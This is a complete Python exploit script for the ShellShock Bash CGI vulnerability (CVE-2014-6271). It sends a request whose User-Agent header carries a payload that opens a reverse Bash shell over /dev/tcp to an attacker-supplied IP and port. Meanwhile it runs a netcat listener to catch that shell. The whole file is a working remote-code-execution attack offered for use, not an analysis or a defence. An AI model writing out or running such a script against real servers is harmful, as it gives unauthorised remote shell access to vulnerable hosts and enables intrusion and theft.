#!/bin/usr/python3

# CVE-2014-6271 Bash CGI Remote Code Execution (ShellShock) exploit rebuild by 0bfxgh0st*

import requests, threading, sys, os

def help():

	print ("CVE-2014-6271")
	print ("Bash CGI Remote Code Execution (ShellShock)")
	print ("Usage python3 cve-2014-6271.py <url> <attacker ip> <attacker port>")

try:

	url = sys.argv[1]
	attacker_ip=sys.argv[2]
	attacker_port=sys.argv[3]
except:

	help()
	sys.exit(1)

p = '() { :;}; /bin/bash -i >& /dev/tcp/' + attacker_ip + '/' + attacker_port + ' 0>&1'

headers = {

    'User-Agent': p
}

def con():

	os.system('nc -lvp ' + attacker_port)

t = threading.Thread(target=con)
t.start()
r = requests.get(url, headers=headers)
